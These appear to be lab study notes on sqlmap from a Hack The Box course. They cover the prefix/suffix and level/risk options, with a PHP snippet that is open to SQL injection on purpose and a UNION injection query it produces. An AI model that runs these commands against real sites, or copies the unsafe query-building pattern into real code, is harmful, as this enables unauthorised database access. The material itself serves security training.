## Prefix/Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1"; 
$result = mysqli_query($link, $query);
```

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```
## Level/Risk

```shell
3kjS@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
```
![](Screenshot%202026-06-22%20at%2013.10.20.png)

```shell
3kjS@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
```
![](Screenshot%202026-06-22%20at%2013.10.50.png)

```shell
3kjS@htb[/htb]$ sqlmap -u www.example.com/?id=1
```
![](Screenshot%202026-06-22%20at%2013.11.21.png)

```shell
3kjS@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```
![](Screenshot%202026-06-22%20at%2013.11.35.png)
